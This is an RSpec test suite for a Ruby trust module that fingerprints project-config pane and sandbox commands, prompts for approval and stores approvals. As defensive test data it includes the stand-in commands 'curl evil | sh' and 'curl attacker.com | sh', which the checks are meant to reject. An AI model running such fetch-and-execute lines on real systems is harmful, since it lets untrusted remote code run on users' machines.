# frozen_string_literal: true

require "stringio"
require "tmpdir"
require "fileutils"

RSpec.describe Orn::Trust do
  def col(*panes)
    Orn::Config::Column.new(panes: panes)
  end

  def columns_layout(*columns)
    Orn::Config::Layout.of_columns(columns)
  end

  def row_panes(*panes)
    Orn::Config::Row.new(
      panes: panes,
      columns: []
    )
  end

  def row_cols(*columns)
    Orn::Config::Row.new(
      panes: [],
      columns: columns
    )
  end

  def rows_layout(*rows)
    Orn::Config::Layout.of_rows(rows)
  end

  def make_sbx(setup: [], start: nil, build_args: [], env: {}, build: :auto)
    if build == :auto
      build = if build_args.empty?
        nil
      else
        Orn::Config::SbxBuild.new(
          dockerfile: nil,
          build_args: build_args
        )
      end
    end
    Orn::Config::SbxConfig.new(
      template: nil,
      kit: nil,
      kits: [],
      cpus: nil,
      memory: nil,
      agent_type: nil,
      setup: setup,
      start: start,
      build: build,
      env: env,
      ports: [],
      columns: nil
    )
  end

  def with_stdin(reader)
    original_stdin = $stdin
    $stdin = reader
    yield
  ensure
    $stdin = original_stdin
  end

  def tty_reader(input)
    reader = StringIO.new(input)
    reader.define_singleton_method(:tty?) { true }
    reader
  end

  # Runs the block against a fake interactive terminal: stdin serves `input`
  # and claims to be a tty, stderr is captured. Returns the block result and
  # the captured prompt output.
  def with_interactive_stdin(input, &block)
    original_stderr = $stderr
    $stderr = StringIO.new
    result = with_stdin(tty_reader(input), &block)
    [result, $stderr.string]
  ensure
    $stderr = original_stderr
  end

  describe ".extract_commands" do
    it "returns nothing for an empty columns layout" do
      expect(described_class.extract_commands(columns_layout)).to be_empty
    end

    it "collects non-empty commands in column order" do
      layout = columns_layout(col("vim", "rake test"), col("htop"))

      expect(described_class.extract_commands(layout)).to eq(["vim", "rake test", "htop"])
    end

    it "skips empty panes" do
      layout = columns_layout(col("vim", ""), col("", "rake test"))

      expect(described_class.extract_commands(layout)).to eq(["vim", "rake test"])
    end

    it "returns nothing when every pane is empty" do
      expect(described_class.extract_commands(columns_layout(col(""), col("")))).to be_empty
    end

    it "collects commands from rows of panes" do
      layout = rows_layout(row_panes("top"), row_panes("bottom"))

      expect(described_class.extract_commands(layout)).to eq(%w[top bottom])
    end

    it "collects commands from rows with nested columns in order" do
      layout = rows_layout(row_panes("main"), row_cols(col("left"), col("right")))

      expect(described_class.extract_commands(layout)).to eq(%w[main left right])
    end
  end

  describe ".strip_commands" do
    it "clears every column command while preserving structure" do
      layout = columns_layout(col("vim", "rake test"), col("htop"))

      stripped = described_class.strip_commands(layout)

      expect(stripped).to eq(columns_layout(col("", ""), col("")))
    end

    it "clears commands in rows and nested columns" do
      layout = rows_layout(row_panes("top"), row_cols(col("left", "bottom-left"), col("right")))

      stripped = described_class.strip_commands(layout)

      expect(stripped).to eq(rows_layout(row_panes(""), row_cols(col("", ""), col(""))))
    end
  end

  describe ".commands_fingerprint" do
    it "is deterministic for the same commands" do
      first = described_class.commands_fingerprint(["vim", "rake test"])
      second = described_class.commands_fingerprint(["vim", "rake test"])

      expect(first).to eq(second)
    end

    it "differs for different commands" do
      expect(described_class.commands_fingerprint(["vim"])).not_to eq(described_class.commands_fingerprint(["emacs"]))
    end

    it "is sensitive to command order" do
      expect(described_class.commands_fingerprint(["vim", "rake test"]))
        .not_to eq(described_class.commands_fingerprint(["rake test", "vim"]))
    end

    it "is sensitive to command boundaries" do
      expect(described_class.commands_fingerprint(%w[a b])).not_to eq(described_class.commands_fingerprint(["ab"]))
    end

    it "is 64 hex characters" do
      fingerprint = described_class.commands_fingerprint(["vim"])

      expect(fingerprint).to match(/\A\h{64}\z/)
    end
  end

  describe ".project_id" do
    it "differs for different paths" do
      expect(described_class.project_id("/home/user/project-a"))
        .not_to eq(described_class.project_id("/home/user/project-b"))
    end

    it "is stable for the same path" do
      first = described_class.project_id("/home/user/project")
      second = described_class.project_id("/home/user/project")

      expect(first).to eq(second)
    end

    it "is 64 hex characters" do
      expect(described_class.project_id("/some/path")).to match(/\A\h{64}\z/)
    end
  end

  describe ".approval_path" do
    it "names a file under the data dir by project id" do
      path = described_class.approval_path("/data/orn/approved", "/home/user/project")

      aggregate_failures do
        expect(File.dirname(path)).to eq("/data/orn/approved")
        expect(File.basename(path)).to eq(described_class.project_id("/home/user/project"))
      end
    end
  end

  describe ".approved? / .save_approval" do
    let(:dir) { Dir.mktmpdir }

    after { FileUtils.remove_entry(dir, true) }

    it "is not approved when no file exists" do
      expect(described_class.approved?(File.join(dir, "missing"), "abc123")).to be(false)
    end

    it "is approved after saving the same fingerprint" do
      path = File.join(dir, "approval")
      fingerprint = described_class.commands_fingerprint(["vim", "rake test"])
      described_class.save_approval(path, fingerprint)

      expect(described_class.approved?(path, fingerprint)).to be(true)
    end

    it "is not approved once the fingerprint changes" do
      path = File.join(dir, "approval")
      described_class.save_approval(path, described_class.commands_fingerprint(["vim"]))

      expect(
        described_class.approved?(
          path,
          described_class.commands_fingerprint(["vim", "curl evil | sh"])
        )
      ).to be(false)
    end

    it "creates parent directories when saving" do
      path = File.join(dir, "nested/deep/approval")
      fingerprint = described_class.commands_fingerprint(["test"])
      described_class.save_approval(path, fingerprint)

      expect(described_class.approved?(path, fingerprint)).to be(true)
    end

    it "treats a garbage file as unapproved" do
      path = File.join(dir, "approval")
      File.write(path, "not-a-hex-number\n")

      expect(described_class.approved?(path, "abc123")).to be(false)
    end

    it "treats an unversioned file as unapproved" do
      path = File.join(dir, "approval")
      File.write(path, "000000000000002a\n")

      expect(described_class.approved?(path, "000000000000002a")).to be(false)
    end

    it "writes the version prefix" do
      path = File.join(dir, "approval")
      described_class.save_approval(path, "deadbeef")

      expect(File.read(path)).to start_with("v1:")
    end
  end

  describe ".confirm_prompt" do
    def prompt(items, input)
      writer = StringIO.new
      result = described_class.confirm_prompt(
        items,
        header: "Project config contains pane commands that will be executed:",
        prompt: "Trust these commands? [y/N] ",
        reader: StringIO.new(input),
        writer: writer
      )
      [result, writer.string]
    end

    it "approves on y, yes, and uppercase variants" do
      aggregate_failures do
        expect(prompt(["vim"], "y\n").first).to be(true)
        expect(prompt(["vim"], "yes\n").first).to be(true)
        expect(prompt(["vim"], "Y\n").first).to be(true)
        expect(prompt(["vim"], "YES\n").first).to be(true)
      end
    end

    it "denies on n, blank, and EOF" do
      aggregate_failures do
        expect(prompt(["vim"], "n\n").first).to be(false)
        expect(prompt(["vim"], "\n").first).to be(false)
        expect(prompt(["vim"], "").first).to be(false)
      end
    end

    it "shows a numbered list of commands and the prompt" do
      _result, output = prompt(%w[cmd1 cmd2], "n\n")

      aggregate_failures do
        expect(output).to include("1. cmd1")
        expect(output).to include("2. cmd2")
        expect(output).to include("Trust these commands? [y/N]")
      end
    end
  end

  describe ".check_trust_with" do
    let(:output_mode) { Orn::OutputMode.default }
    let(:layout) { columns_layout(col("vim")) }
    let(:tmp) { Dir.mktmpdir }
    let(:data_dir) { File.join(tmp, "data") }

    after { FileUtils.remove_entry(tmp, true) }

    it "passes global-source layouts through untouched" do
      result = described_class.check_trust_with(
        output_mode,
        "/project",
        layout,
        :global,
        data_dir
      )

      expect(result).to eq(layout)
    end

    it "passes default-source layouts through untouched" do
      result = described_class.check_trust_with(
        output_mode,
        "/project",
        layout,
        :default,
        data_dir
      )

      expect(result).to eq(layout)
    end

    it "passes a project layout with only empty panes through untouched" do
      empty = columns_layout(col(""), col(""))

      result = described_class.check_trust_with(
        output_mode,
        "/project",
        empty,
        :project,
        data_dir
      )

      expect(result).to eq(empty)
    end

    it "passes an already-approved project layout through untouched" do
      fingerprint = described_class.commands_fingerprint(described_class.extract_commands(layout))
      described_class.save_approval(described_class.approval_path(data_dir, "/project/root"), fingerprint)

      result = described_class.check_trust_with(
        output_mode,
        "/project/root",
        layout,
        :project,
        data_dir
      )

      expect(result).to eq(layout)
    end

    context "when stdin is a tty and the commands are unapproved" do
      def check_interactively(input)
        with_interactive_stdin(input) do
          described_class.check_trust_with(
            output_mode,
            "/project",
            layout,
            :project,
            data_dir
          )
        end
      end

      it "prompts, persists the approval, and returns the layout unchanged" do
        result, prompt_output = check_interactively("y\n")

        fingerprint = described_class.commands_fingerprint(["vim"])
        approval_file = described_class.approval_path(data_dir, "/project")
        aggregate_failures do
          expect(result).to eq(layout)
          expect(prompt_output).to include("pane commands that will be executed")
          expect(prompt_output).to include("1. vim")
          expect(prompt_output).to include("Trust these commands? [y/N]")
          expect(described_class.approved?(approval_file, fingerprint)).to be(true)
        end
      end

      it "does not prompt again once approved" do
        check_interactively("y\n")

        result = with_stdin(StringIO.new("")) do
          described_class.check_trust_with(
            output_mode,
            "/project",
            layout,
            :project,
            data_dir
          )
        end

        expect(result).to eq(layout)
      end

      it "strips the commands when declined" do
        result, prompt_output = check_interactively("n\n")

        aggregate_failures do
          expect(result).to eq(columns_layout(col("")))
          expect(prompt_output).to include("Skipping pane commands (not approved)")
        end
      end

      it "records nothing when declined, so a later non-interactive run still fails" do
        check_interactively("n\n")

        expect do
          with_stdin(StringIO.new("")) do
            described_class.check_trust_with(
              output_mode,
              "/project",
              layout,
              :project,
              data_dir
            )
          end
        end
          .to raise_error(Orn::Error, /untrusted pane commands/)
      end
    end
  end

  describe ".check_trust" do
    let(:output_mode) { Orn::OutputMode.default }
    let(:layout) { columns_layout(col("vim")) }
    let(:tmp) { Dir.mktmpdir }

    after { FileUtils.remove_entry(tmp, true) }

    it "raises when neither XDG_DATA_HOME nor HOME is available" do
      ENV.delete("XDG_DATA_HOME")
      ENV.delete("HOME")

      expect do
        described_class.check_trust(
          output_mode,
          "/project",
          layout,
          :project
        )
      end
        .to raise_error(Orn::Error, /Could not determine data directory/)
    end

    it "reads approvals from $XDG_DATA_HOME/orn/approved" do
      ENV["XDG_DATA_HOME"] = tmp
      approved_dir = File.join(
        tmp,
        "orn",
        "approved"
      )
      fingerprint = described_class.commands_fingerprint(["vim"])
      described_class.save_approval(described_class.approval_path(approved_dir, "/project"), fingerprint)

      result = with_stdin(StringIO.new("")) do
        described_class.check_trust(
          output_mode,
          "/project",
          layout,
          :project
        )
      end

      expect(result).to eq(layout)
    end
  end

  describe ".check_trust_non_interactive" do
    let(:output_mode) { Orn::OutputMode.default }
    let(:tmp) { Dir.mktmpdir }

    after { FileUtils.remove_entry(tmp, true) }

    it "raises when neither XDG_DATA_HOME nor HOME is available" do
      ENV.delete("XDG_DATA_HOME")
      ENV.delete("HOME")

      expect do
        described_class.check_trust_non_interactive(
          output_mode,
          "/project",
          columns_layout(col("vim")),
          :project
        )
      end
        .to raise_error(Orn::Error, /Could not determine data directory/)
    end

    it "raises for unapproved project commands even when stdin is a tty" do
      ENV["XDG_DATA_HOME"] = tmp
      layout = columns_layout(col("vim"))

      with_interactive_stdin("y\n") do
        expect do
          described_class.check_trust_non_interactive(
            output_mode,
            "/project",
            layout,
            :project
          )
        end
          .to raise_error(Orn::Error, /untrusted pane commands/)
      end
    end
  end

  describe ".check_trust_inner (non-interactive)" do
    let(:output_mode) { Orn::OutputMode.default }
    let(:tmp) { Dir.mktmpdir }
    let(:data_dir) { File.join(tmp, "data") }

    after { FileUtils.remove_entry(tmp, true) }

    it "raises for unapproved project commands" do
      layout = columns_layout(col("curl attacker.com | sh"))

      expect do
        described_class.check_trust_inner(
          output_mode,
          "/project",
          layout,
          :project,
          data_dir,
          interactive: false
        )
      end
        .to raise_error(Orn::Error, /untrusted pane commands/)
    end

    it "raises when the stored approval is stale" do
      old = described_class.commands_fingerprint(["vim"])
      described_class.save_approval(described_class.approval_path(data_dir, "/project"), old)
      layout = columns_layout(col("curl attacker.com | sh"))

      expect do
        described_class.check_trust_inner(
          output_mode,
          "/project",
          layout,
          :project,
          data_dir,
          interactive: false
        )
      end
        .to raise_error(Orn::Error)
    end
  end

  describe ".sbx_commands?" do
    it "is false with no setup, start, build args, or env" do
      expect(described_class.sbx_commands?(make_sbx)).to be(false)
    end

    it "is true with setup" do
      expect(described_class.sbx_commands?(make_sbx(setup: ["setup.sh"]))).to be(true)
    end

    it "is true with a start command" do
      expect(described_class.sbx_commands?(make_sbx(start: "foreman start"))).to be(true)
    end

    it "is true with build args" do
      expect(described_class.sbx_commands?(make_sbx(build_args: ["MY_SECRET"]))).to be(true)
    end

    it "is true with env vars" do
      expect(described_class.sbx_commands?(make_sbx(env: { "KEY" => "value" }))).to be(true)
    end

    it "is false when build has no build args" do
      sbx = make_sbx(
        build: Orn::Config::SbxBuild.new(
          dockerfile: "Dockerfile",
          build_args: []
        )
      )

      expect(described_class.sbx_commands?(sbx)).to be(false)
    end
  end

  describe ".format_sbx_items" do
    it "labels a single setup command" do
      items = described_class.format_sbx_items(make_sbx(setup: ["setup.sh"]))

      expect(items).to contain_exactly(a_string_including("[setup]", "setup.sh"))
    end

    it "labels the start command" do
      items = described_class.format_sbx_items(make_sbx(start: "foreman start"))

      expect(items).to contain_exactly(a_string_including("[start]", "foreman start"))
    end

    it "labels each build arg" do
      items = described_class.format_sbx_items(make_sbx(build_args: %w[AWS_KEY DB_PASS]))

      aggregate_failures do
        expect(items[0]).to include("[build arg]", "AWS_KEY")
        expect(items[1]).to include("DB_PASS")
      end
    end

    it "labels every field together in order" do
      items = described_class.format_sbx_items(
        make_sbx(
          setup: ["setup.sh"],
          start: "start.sh",
          build_args: ["TOKEN"]
        )
      )

      aggregate_failures do
        expect(items[0]).to include("[setup]")
        expect(items[1]).to include("[start]")
        expect(items[2]).to include("[build arg]")
      end
    end

    it "labels each env var" do
      items = described_class.format_sbx_items(make_sbx(env: { "API_KEY" => "secret" }))

      expect(items).to contain_exactly(a_string_including("[env]", "API_KEY = secret"))
    end

    it "is empty when nothing needs approval" do
      expect(described_class.format_sbx_items(make_sbx)).to be_empty
    end
  end

  describe ".sbx_fingerprint" do
    it "is deterministic" do
      sbx = make_sbx(
        setup: ["setup.sh"],
        start: "start.sh",
        build_args: ["KEY"]
      )
      first = described_class.sbx_fingerprint(sbx)
      second = described_class.sbx_fingerprint(sbx)

      expect(first).to eq(second)
    end

    it "differs for different setup, start, and build args" do
      aggregate_failures do
        expect(described_class.sbx_fingerprint(make_sbx(setup: ["safe.sh"])))
          .not_to eq(described_class.sbx_fingerprint(make_sbx(setup: ["evil.sh"])))
        expect(described_class.sbx_fingerprint(make_sbx(start: "safe")))
          .not_to eq(described_class.sbx_fingerprint(make_sbx(start: "evil")))
        expect(described_class.sbx_fingerprint(make_sbx(build_args: ["SAFE"])))
          .not_to eq(described_class.sbx_fingerprint(make_sbx(build_args: ["AWS_SECRET"])))
      end
    end

    it "distinguishes the same command in setup vs start" do
      expect(described_class.sbx_fingerprint(make_sbx(setup: ["cmd"])))
        .not_to eq(described_class.sbx_fingerprint(make_sbx(start: "cmd")))
    end

    it "is sensitive to setup and build-arg order" do
      aggregate_failures do
        expect(described_class.sbx_fingerprint(make_sbx(setup: %w[cmd1 cmd2])))
          .not_to eq(described_class.sbx_fingerprint(make_sbx(setup: %w[cmd2 cmd1])))
        expect(described_class.sbx_fingerprint(make_sbx(build_args: %w[A B])))
          .not_to eq(described_class.sbx_fingerprint(make_sbx(build_args: %w[B A])))
      end
    end

    it "is sensitive to setup boundaries" do
      expect(described_class.sbx_fingerprint(make_sbx(setup: %w[a b])))
        .not_to eq(described_class.sbx_fingerprint(make_sbx(setup: ["ab"])))
    end

    it "is sensitive to env keys and values, and stable for the same env" do
      first = described_class.sbx_fingerprint(make_sbx(env: { "KEY" => "value" }))
      second = described_class.sbx_fingerprint(make_sbx(env: { "KEY" => "value" }))

      aggregate_failures do
        expect(first).not_to eq(described_class.sbx_fingerprint(make_sbx(env: { "OTHER" => "value" })))
        expect(first).not_to eq(described_class.sbx_fingerprint(make_sbx(env: { "KEY" => "other" })))
        expect(first).to eq(second)
      end
    end

    it "is 64 hex characters" do
      fingerprint = described_class.sbx_fingerprint(
        make_sbx(
          setup: ["setup.sh"],
          start: "start",
          build_args: ["KEY"]
        )
      )

      expect(fingerprint).to match(/\A\h{64}\z/)
    end
  end

  describe ".check_sbx_trust" do
    let(:tmp) { Dir.mktmpdir }
    let(:sbx) { make_sbx(setup: ["setup.sh"]) }
    let(:sbx_approval_file) do
      approved_dir = File.join(
        tmp,
        "orn",
        "approved"
      )
      File.join(approved_dir, "sbx-#{described_class.project_id("/project")}")
    end

    before { ENV["XDG_DATA_HOME"] = tmp }

    after { FileUtils.remove_entry(tmp, true) }

    it "raises when neither XDG_DATA_HOME nor HOME is available" do
      ENV.delete("XDG_DATA_HOME")
      ENV.delete("HOME")

      expect { described_class.check_sbx_trust("/project", sbx) }
        .to raise_error(Orn::Error, /Could not determine data directory/)
    end

    it "passes without prompting when the sbx config has nothing to approve" do
      result = with_stdin(StringIO.new("")) do
        described_class.check_sbx_trust("/project", make_sbx)
      end

      expect(result).to be_nil
    end

    it "prompts and saves the approval under an sbx- prefixed file" do
      _result, prompt_output = with_interactive_stdin("y\n") do
        described_class.check_sbx_trust("/project", sbx)
      end

      aggregate_failures do
        expect(prompt_output).to include("The sbx config will run these commands:")
        expect(prompt_output).to include("setup.sh")
        expect(prompt_output).to include("Approve? [y/N]")
        expect(described_class.approved?(sbx_approval_file, described_class.sbx_fingerprint(sbx))).to be(true)
      end
    end

    it "raises when the user declines" do
      with_interactive_stdin("n\n") do
        expect { described_class.check_sbx_trust("/project", sbx) }
          .to raise_error(Orn::Error, "Sandbox commands not approved")
      end
    end

    it "raises non-interactively and lists the commands in the message" do
      with_stdin(StringIO.new("")) do
        expect { described_class.check_sbx_trust("/project", sbx) }
          .to raise_error(Orn::Error, /untrusted sandbox commands.*setup\.sh/m)
      end
    end

    it "does not prompt when the commands are already approved" do
      described_class.save_approval(sbx_approval_file, described_class.sbx_fingerprint(sbx))

      result = with_stdin(StringIO.new("")) do
        described_class.check_sbx_trust("/project", sbx)
      end

      expect(result).to be_nil
    end
  end
end
